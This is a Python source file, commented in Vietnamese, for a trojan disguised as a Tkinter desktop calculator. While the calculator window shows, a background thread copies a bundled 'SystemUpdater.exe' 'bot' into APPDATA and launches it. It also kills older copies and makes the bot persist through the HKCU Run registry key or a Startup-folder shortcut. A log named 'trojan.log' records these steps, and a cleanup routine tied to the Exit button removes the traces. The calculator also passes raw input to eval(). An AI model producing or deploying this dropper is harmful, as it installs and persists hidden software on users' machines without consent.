import os
import sys
import subprocess
import threading
import tkinter as tk
import tkinter.messagebox as messagebox
import winreg
import shutil
import logging
import psutil
import time

# Kiểm tra và giới hạn một instance
pid_file = os.path.join(os.getenv('APPDATA'), 'calculator.pid')
try:
    if os.path.exists(pid_file):
        try:
            with open(pid_file, 'r') as f:
                pid = int(f.read().strip())
            if psutil.pid_exists(pid):
                subprocess.Popen([sys.executable, __file__, "already_running"], shell=True)
                sys.exit(0)
            else:
                os.remove(pid_file)
        except (ValueError, OSError) as e:
            logging.error(f"Lỗi đọc file PID: {e}, xóa file và tiếp tục.")
            if os.path.exists(pid_file):
                os.remove(pid_file)

    with open(pid_file, 'w') as f:
        f.write(str(os.getpid()))
except PermissionError as e:
    print(f"Lỗi quyền truy cập khi ghi file PID: {e}. Chạy chương trình với quyền Admin.")
    sys.exit(1)
except Exception as e:
    print(f"Lỗi khi kiểm tra PID: {e}")
    sys.exit(1)

try:
    # Cấu hình logging cho trojan.log
    log_path = os.path.join(os.getenv('APPDATA'), 'trojan.log')
    try:
        logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s,%(msecs)d - %(message)s', encoding='utf-8')
    except PermissionError as e:
        print(f"Lỗi quyền truy cập khi tạo log: {e}. Chạy với quyền Admin.")
        sys.exit(1)

    # Constants
    APP_NAME = "SystemUpdater"
    BOT_PATH = os.path.join(os.getenv('APPDATA'), "SystemUpdater.exe")
    AUTO_CLEANUP = False
    bot_file_handle = None

    # Copy file bot và chạy lần đầu
    def drop_bot():
        global bot_file_handle
        try:
            if not os.path.exists(BOT_PATH):
                current_dir = os.path.dirname(os.path.abspath(__file__))
                source_bot = os.path.join(current_dir, "SystemUpdater.exe")
                if not os.path.isfile(source_bot):
                    logging.error(f"SystemUpdater.exe không tồn tại tại: {source_bot}")
                    return
                shutil.copy(source_bot, BOT_PATH)
                bot_file_handle = open(BOT_PATH, 'rb')
                logging.info(f"Đã copy {source_bot} sang {BOT_PATH}")
            
            # Kiểm tra và dừng các tiến trình bot cũ
            bot_running = False
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == "SystemUpdater.exe":
                    try:
                        proc.kill()
                        logging.info(f"Đã dừng bot cũ với PID: {proc.info['pid']} trước khi khởi động mới.")
                    except Exception as e:
                        logging.error(f"Lỗi khi dừng bot cũ: {e}")
                    bot_running = True
            
            if bot_running:
                logging.info("Đã tìm thấy bot cũ, đã dừng để khởi động mới.")
            
            # Khởi động bot mới
            subprocess.Popen([BOT_PATH], creationflags=subprocess.CREATE_NEW_CONSOLE)
            logging.info("Bot đã được chạy từ drop_bot.")
        except PermissionError as e:
            logging.error(f"Lỗi quyền truy cập trong drop_bot: {e}")
            return
        except Exception as e:
            logging.error(f"Lỗi trong drop_bot: {e}")
            return

        setup_persistence()

    # Cơ chế duy trì (Persistence)
    def setup_persistence():
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_QUERY_VALUE) as reg_key:
                existing_path, _ = winreg.QueryValueEx(reg_key, APP_NAME)
                if existing_path == BOT_PATH:
                    logging.info("Bot đã được thêm vào Registry từ trước.")
                    return
        except FileNotFoundError:
            pass
        except Exception as e:
            logging.warning(f"Lỗi kiểm tra Registry: {e}")
        
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, BOT_PATH)
            logging.info("Đã thêm bot vào Registry thành công.")
            return
        except Exception as e:
            logging.warning(f"Không thể thêm vào Registry (có thể thiếu quyền): {e}")

        startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup", f"{APP_NAME}.lnk")
        try:
            if not os.path.exists(startup_path):
                import winshell
                from win32com.client import Dispatch
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(startup_path)
                shortcut.Targetpath = BOT_PATH
                shortcut.save()
                logging.info(f"Đã thêm bot vào Startup folder: {startup_path}")
            else:
                logging.info("Bot đã có trong Startup folder từ trước.")
        except Exception as e:
            logging.error(f"Không thể thêm vào Startup folder: {e}")

    # Hàm tự hủy
    def cleanup():
        global bot_file_handle
        stop_file = os.path.join(os.getenv('APPDATA'), "stop_bot.txt")
        try:
            with open(stop_file, 'w') as f:
                f.write("stop")
            logging.info("Đã tạo file tín hiệu dừng bot.")
        except Exception as e:
            logging.error(f"Lỗi khi tạo file tín hiệu dừng: {e}")
            print(f"Lỗi khi tạo file tín hiệu dừng: {e}")

        max_wait_time = 10  # Thời gian chờ tối đa 10 giây
        start_time = time.time()
        bot_stopped = False

        try:
            while time.time() - start_time < max_wait_time:
                bot_running = False
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'] == "SystemUpdater.exe":
                        proc.kill()
                        logging.info(f"Đã dừng bot với PID: {proc.info['pid']}")
                        bot_running = True
                if not bot_running:
                    bot_stopped = True
                    break
                time.sleep(1)  # Chờ 1 giây trước khi kiểm tra lại
            if not bot_stopped:
                logging.warning("Không thể dừng tất cả tiến trình SystemUpdater.exe trong thời gian chờ.")
                print("Không thể dừng tất cả tiến trình SystemUpdater.exe trong thời gian chờ.")
        except Exception as e:
            logging.error(f"Lỗi khi dừng bot: {e}")
            print(f"Lỗi khi dừng bot: {e}")
        
        if bot_file_handle:
            try:
                bot_file_handle.close()
                logging.info("Đã đóng handle của file bot.")
            except Exception as e:
                logging.error(f"Lỗi khi đóng handle của file bot: {e}")
                print(f"Lỗi khi đóng handle của file bot: {e}")
        
        try:
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, APP_NAME)
            logging.info("Đã xóa mục Registry.")
        except Exception as e:
            logging.warning(f"Không thể xóa mục Registry: {e}")
            print(f"Không thể xóa mục Registry: {e}")
        
        startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup", f"{APP_NAME}.lnk")
        try:
            if os.path.exists(startup_path):
                os.remove(startup_path)
                logging.info("Đã xóa shortcut trong Startup folder.")
        except Exception as e:
            logging.error(f"Không thể xóa shortcut trong Startup folder: {e}")
            print(f"Không thể xóa shortcut trong Startup folder: {e}")
        
        if os.path.exists(BOT_PATH):
            try:
                os.remove(BOT_PATH)
                logging.info(f"Đã xóa {BOT_PATH}")
            except Exception as e:
                logging.error(f"Không thể xóa {BOT_PATH}: {e}")
                print(f"Không thể xóa {BOT_PATH}: {e}")
        
        for log in [log_path, os.path.join(os.getenv('APPDATA'), "system_log.txt")]:
            if os.path.exists(log):
                try:
                    os.remove(log)
                    logging.info(f"Đã xóa file log: {log}")
                except Exception as e:
                    logging.error(f"Không thể xóa file log {log}: {e}")
                    print(f"Không thể xóa file log {log}: {e}")

        if os.path.exists(stop_file):
            try:
                os.remove(stop_file)
                logging.info("Đã xóa file tín hiệu dừng bot.")
            except Exception as e:
                logging.error(f"Lỗi khi xóa file tín hiệu dừng: {e}")
                print(f"Lỗi khi xóa file tín hiệu dừng: {e}")

    def run_calculator():
        root = tk.Tk()
        root.title("Simple Calculator")
        root.resizable(0, 0)
        root.configure(bg='#f0f0f0')
        
        display = tk.Entry(root, width=20, font=('Arial', 20), bd=5, insertwidth=4, justify='right')
        display.grid(row=0, column=0, columnspan=4, padx=10, pady=10)
        
        memory = 0
        
        def button_click(value):
            current = display.get()
            display.delete(0, tk.END)
            display.insert(0, current + str(value))
        
        def clear_display():
            display.delete(0, tk.END)
        
        def calculate():
            try:
                expression = display.get()
                result = eval(expression)
                display.delete(0, tk.END)
                display.insert(0, result)
            except Exception as e:
                display.delete(0, tk.END)
                display.insert(0, "Error")
                logging.error(f"Lỗi tính toán: {e}")
        
        def memory_add():
            nonlocal memory
            try:
                memory += float(display.get())
                logging.info(f"Memory updated: {memory}")
            except:
                display.delete(0, tk.END)
                display.insert(0, "Error")
        
        def memory_subtract():
            nonlocal memory
            try:
                memory -= float(display.get())
                logging.info(f"Memory updated: {memory}")
            except:
                display.delete(0, tk.END)
                display.insert(0, "Error")
        
        def memory_recall():
            display.delete(0, tk.END)
            display.insert(0, memory)
        
        def button_exit():
            if messagebox.askyesno("Xác nhận", "Bạn có chắc muốn thoát?"):
                cleanup()
                root.destroy()
        
        def on_closing():
            if AUTO_CLEANUP and messagebox.askyesno("Xác nhận", "Bạn có chắc muốn thoát?"):
                cleanup()
                root.destroy()
            else:
                root.destroy()
        
        button_labels = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            '0', '.', '=', '+'
        ]
        
        row_val = 1
        col_val = 0
        
        for button in button_labels:
            if button == '=':
                tk.Button(root, text=button, width=5, height=2,
                         font=('Arial', 12, 'bold'),
                         bg='#4CAF50', fg='white',
                         command=calculate).grid(row=row_val, column=col_val, padx=5, pady=5)
            else:
                tk.Button(root, text=button, width=5, height=2,
                         font=('Arial', 12),
                         bg='#f9f9f9', fg='#333333',
                         command=lambda b=button: button_click(b)).grid(row=row_val, column=col_val, padx=5, pady=5)
            
            col_val += 1
            if col_val > 3:
                col_val = 0
                row_val += 1
        
        tk.Button(root, text="C", width=11, height=2,
                 font=('Arial', 12, 'bold'),
                 bg='#f44336', fg='white',
                 command=clear_display).grid(row=row_val, column=0, columnspan=2, padx=5, pady=5)
        
        tk.Button(root, text="M+", width=5, height=2,
                 font=('Arial', 12),
                 bg='#2196F3', fg='white',
                 command=memory_add).grid(row=row_val, column=2, padx=5, pady=5)
        
        tk.Button(root, text="M-", width=5, height=2,
                 font=('Arial', 12),
                 bg='#2196F3', fg='white',
                 command=memory_subtract).grid(row=row_val, column=3, padx=5, pady=5)
        
        tk.Button(root, text="MR", width=5, height=2,
                 font=('Arial', 12),
                 bg='#2196F3', fg='white',
                 command=memory_recall).grid(row=row_val + 1, column=0, padx=5, pady=5)
        
        tk.Button(root, text="Exit", width=11, height=2,
                 font=('Arial', 12, 'bold'),
                 bg='#f44336', fg='white',
                 command=button_exit).grid(row=row_val + 1, column=1, columnspan=2, padx=5, pady=5)
        
        root.protocol("WM_DELETE_WINDOW", on_closing)
        
        root.mainloop()

    if __name__ == "__main__":
        threading.Thread(target=drop_bot, daemon=True).start()
        run_calculator()
finally:
    if os.path.exists(pid_file):
        try:
            os.remove(pid_file)
        except Exception as e:
            logging.error(f"Lỗi khi xóa file PID: {e}")
            print(f"Lỗi khi xóa file PID: {e}")